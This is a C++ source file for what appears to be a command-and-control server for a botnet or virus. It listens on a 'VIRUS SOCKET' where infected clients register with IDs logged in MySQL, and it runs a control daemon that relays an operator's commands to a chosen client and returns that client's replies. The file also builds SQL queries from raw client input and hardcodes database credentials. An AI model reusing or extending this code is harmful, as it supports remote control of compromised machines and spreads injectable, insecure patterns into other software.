#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <sstream>
#include <mysql/mysql.h>
#include <time.h>
#include <vector>

using namespace std;

struct Connection
{ 
    int sock;
	string client_id;
    sockaddr_in addr;
};

string itoa(long i)
{
    stringstream ss;
    ss << i;
    return ss.str();
}

// GLOBAL VARS //

stringstream ss;
string cid;

void *thread_function( void *ptr );
void *client_thread( void *ptr );
void *client_thread_function( void *ptr );
int readline (int s, string &str, int buffersize);
vector<Connection*> connections;

int update_client();
MYSQL *mConnection;


// GLOBAL VARS END //

int main()
{
	srand(time(NULL));
	MYSQL_RES *mTabelle;
    MYSQL_ROW mRecord;
    int mError;
    mConnection = mysql_init(NULL);
	mysql_real_connect(mConnection,"localhost","main","437280","main",3306,0,0);
		
    if (mConnection == NULL)  {
        printf("Could not connect. Leaving: %s",mysql_error(mConnection));
        return 1;
    } else {
		printf("Connected to MySQL-Server!\n");
    }
    //mysql_close(mConnection);
	int result = mysql_query(mConnection, "SELECT * FROM log ORDER BY id DESC LIMIT 0,10");
    if(result == 0) {
		cout << "Query succeeded.\n" << endl; 
		MYSQL_RES* res = mysql_store_result(mConnection);
		MYSQL_ROW row = mysql_fetch_row(res);
		for(int i = 0; i < mysql_num_fields(res); i++ ) {
			cout << row[i] << "|";
		}
		cout << "\n" << endl;
	} else {
		cout << "ERROR!\n" << mysql_error(mConnection) << endl;
	}	
	
	// VIRUS SOCKET //
	int sock_server = socket(AF_INET, SOCK_STREAM, 0);
	if(sock_server < 0)
		{
		    cout << "Error: Could not create socket!" << endl;
		    return 1;
		}
	int opt = 1;
	setsockopt(sock_server, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

	struct sockaddr_in addr_server;
	memset(&addr_server, 0, sizeof(sockaddr_in));

	addr_server.sin_family = AF_INET;
	addr_server.sin_addr.s_addr = INADDR_ANY;
	addr_server.sin_port = htons(22222);


	if(bind(sock_server, (struct sockaddr*)&addr_server, sizeof(sockaddr_in)) < 0)
	{
	    cout << "Error: Could not bind socket!" << endl;
	    return 1;
	}
	listen(sock_server, 5);
	cout << "Server started!\n" << endl;	
	// VIRUS SOCKET END //

	// SOCK SHIT //

	int sock_server2 = socket(AF_INET, SOCK_STREAM, 0);
	if(sock_server2 < 0)
		{
		    cout << "Error: Could not create socket!" << endl;
		    return 1;
		}
	int opt2 = 1;
	setsockopt(sock_server2, SOL_SOCKET, SO_REUSEADDR, (char*)&opt2, sizeof(opt2));

	struct sockaddr_in addr_server2;
	memset(&addr_server2, 0, sizeof(sockaddr_in));

	addr_server2.sin_family = AF_INET;
	addr_server2.sin_addr.s_addr = INADDR_ANY;
	addr_server2.sin_port = htons(22522);


	if(bind(sock_server2, (struct sockaddr*)&addr_server2, sizeof(sockaddr_in)) < 0)
	{
	    cout << "Error: Could not bind socket!" << endl;
	    return 1;
	}
	listen(sock_server2, 5);
	cout << "Control Deamon started!\n" << endl;
		
	// SOCK SHIT END // 		


	pthread_t client_control;
	pthread_create(&client_control, NULL, client_thread, &sock_server2);


	
	int sock;
	struct sockaddr_in addr;
	socklen_t addr_len = sizeof(sockaddr_in);
	Connection* c;
																				    
	while((sock = accept(sock_server, (struct sockaddr*)&addr, &addr_len)) >= 0)
	{
		c = new Connection();
		c->sock = sock;
		c->addr = addr;
		pthread_t thread;
		pthread_create(&thread, NULL, thread_function, c);
		char buf[4096];
		string sendback;
		int res;
		memset(buf, 0, 4096);	
	}
}

void *thread_function( void *ptr )
{
	Connection* c = (Connection*)ptr;
	
	char buf[4096];
    string sendback;
    int res;
    memset(buf, 0, 4096);
	string error = "";
	bool login;
	
	while((res = recv(c->sock, &buf, 4096, 0)) > 0) {
		
		// TIME STAMP SECTION //
		
		time_t rawtime;
		struct tm * timeinfo;
		char buffer [80];

		time (&rawtime);
		timeinfo = localtime (&rawtime);

		strftime (buffer,80,"[%Y/%m/%d, %H:%M:%S]:\n",timeinfo);
  		cout << buffer << endl;
		
		// TIME STAMP SECTION END //		

		string data = buf;
		string buf_new = buf;
		//buf.erase(std::remove(buf.begin(), buf.end(), '\n'), buf.end());
		buf_new = buf_new.substr(0,buf_new.length()-1);
		cout << "\t\"" << buf_new << "\"" << endl;
		ss.str("");
		ss.clear();	
		ss
		<< (c->addr.sin_addr.s_addr & 0x000000FF) << "."
		<< ((c->addr.sin_addr.s_addr & 0x0000FF00) >> 8) << "."
		<< ((c->addr.sin_addr.s_addr & 0x00FF0000) >> 16) << "."
		<< ((c->addr.sin_addr.s_addr & 0xFF000000) >> 24);

		//Unique client ID is 32bit hex string. Client is sending ID in front of the request.
		cid = data.substr(0,32);
		cout << "\tChecking request..." << endl;
		if(buf[32] == ':') {
			if(cid == "00000000000000000000000000000000") {
				cout << "\tCreating unique ID..." << endl;
				string str;
				string array = "abcdef0123456789";
				for(int i = 0; i < 32; i++) {
					int num = rand() % 16;
					str += array[num];
				}
				int result = mysql_query(mConnection, 
				("INSERT INTO clients (ip, date, joined, cid) VALUES ('"+ss.str()+"', '"+itoa(time(NULL))+"', '"+itoa(time(NULL))+"', '"+ str +"')").c_str());
				
				if(result == 0) {
					sendback = string() + "#210-OK: id:" + str + "\n";
		            send(c->sock, sendback.c_str(), sendback.size(), 0);
					cout << "\tNew Client '"+ str +"' added.\n" << endl;
				} else {
					sendback = string() + "#510-ER: Query failed. " + mysql_error(mConnection) + "\n";
	                send(c->sock, sendback.c_str(), sendback.size(), 0);
				}
				login = true;
			} else {
				
				cout << "\tMaking query..." << endl;
				
				int result = mysql_query(mConnection, ("SELECT * FROM clients WHERE cid = '" + cid + "'").c_str());
				MYSQL_RES* res = mysql_store_result(mConnection);
				cout << "\t" << string(&buf[32]) << endl;
				if(login == false) { //&& string(&buf[32]) == ":login") {
					
					if(mysql_num_rows(res) == 0) {
					//MYSQL_ROW row = mysql_fetch_row(res);
						sendback = string() + "#540-ER: You seem not to have an ID.\n";
						send(c->sock, sendback.c_str(), sendback.size(), 0);
						cout << "\t" << cid  << ": ID not found." << endl;;
						error += "Client has no ID.\n";
					} else {
						cout << "\t#220-OK: " << cid  << " has an ID.\n"  << endl;
						sendback = string() + "#220-OK: You have an valid ID! Login succeeded.\n";
						send(c->sock, sendback.c_str(), sendback.size(), 0);
						c->client_id = cid;	

						update_client();
						
						login = true;
						connections.push_back(c);
					}

				} else {
		
					if(string(&buf[33]) == "\n") {
						sendback = string() + "#300-ER: Empty String given.\n";
						send(c->sock, sendback.c_str(), sendback.size(), 0);
					
					} else if(string(&buf[33]) == "ping\n") {
						sendback = string()+ "#200-OK: pong\n";
						send(c->sock, sendback.c_str(), sendback.size(), 0);		
					} else if(string(&buf[33]) == "test\n") {
						sendback = string()+ "#230-OK: TEST\n";
		                send(c->sock, sendback.c_str(), sendback.size(), 0);
	
					} else {
						sendback = string()+ "#510-ER: Command not found.\n";
	                    send(c->sock, sendback.c_str(), sendback.size(), 0);
						cout << "\t#510-ER: Command not found" << endl; 
					}

					if(error == "") {
						cout << "\tEverything OK!\n" << endl;
					} else  {
						cout << string() + error << endl;
					}

				}
			}	
			
		} else {
            sendback = string() + "#500-ER: Wrong request sent:" +data + "\n";
            send(c->sock, sendback.c_str(), sendback.size(), 0);
			cout << "#500-ER: " << cid << " sent wrong request" << endl;
        }

		memset(buf, 0, 4096);
	}
    close(c->sock);
	
}

void* client_thread ( void *ptr ) {

	int sock; 
	struct sockaddr_in addr;
	socklen_t addr_len = sizeof(addr);
	int sock_server = *(int*)ptr;

	while((sock = accept(sock_server, (struct sockaddr*)&addr, &addr_len)) >= 0)
	{
		pthread_t thread;
		pthread_create(&thread, NULL, client_thread_function, &sock);
		
		
		cout << "EchoClient connected!" << endl;
		
		
		char buf[4096];
		string sendback;
		int res;
		memset(buf, 0, 4096);	
	}
	
		
}

void* client_thread_function ( void *ptr ) {
	int sock = *(int*)ptr;
	string data;
	while(readline(sock, data, 4096) != -1) {

		int result = mysql_query(mConnection,
			("SELECT * FROM main.clients WHERE cid = '"+data+"'").c_str());
		MYSQL_RES* res = mysql_store_result(mConnection);

		if(mysql_num_rows(res) != 0) {
			for(int i = 0; i < connections.size(); i++) {
				Connection* next = connections[i];	
				if(next->client_id == data) {
					string sendback = "250-OK: Client exists, connected.\n";
					send(sock, sendback.c_str(), sendback.size(), 0);

					sendback = "#250-OK: Init control mode\n";
					send(next->sock, sendback.c_str(), sendback.size(), 0); 

					string client_data;
					while( readline(sock, client_data, 4096) != -1 ) {
						client_data += "\n";
						send(next->sock, client_data.c_str(), client_data.size(), 0);
						
						string virus_data;
						readline(next->sock, virus_data, 4096);
						send(sock, virus_data.c_str(), virus_data.size(), 0);
					}					
				}
			}
		} else {
			string sendback = "#580-ER: This Client was not found in the database.\n";
			send(sock, sendback.c_str(), sendback.size(), 0);
		}
		if(send(sock, data.c_str(), data.size(), 0) == -1) break;
		cout << data << endl;
	}

}

// PAUSE //

int readline (int s, string &str, int buffsize)
{
    str = "";
    int ret = 0;
    char nc = 0;
    for(int i = 0; i < buffsize; i++)
    {
        if(recv(s, &nc, 1, 0) != 1) return -1;
        if(nc == '\n') return i;
        str += nc;
    }
    return str.size();
}

// PAUSE // 

int update_client() 
{
	 
	int result = mysql_query(mConnection, 
		("UPDATE clients SET ip = '"+ss.str()+"', date = '"+itoa(time(NULL))+"' WHERE cid = '"+cid+"'").c_str());
	if(result == 0) {
		return 0;
	} else { 
		return -1;
	}
				
}
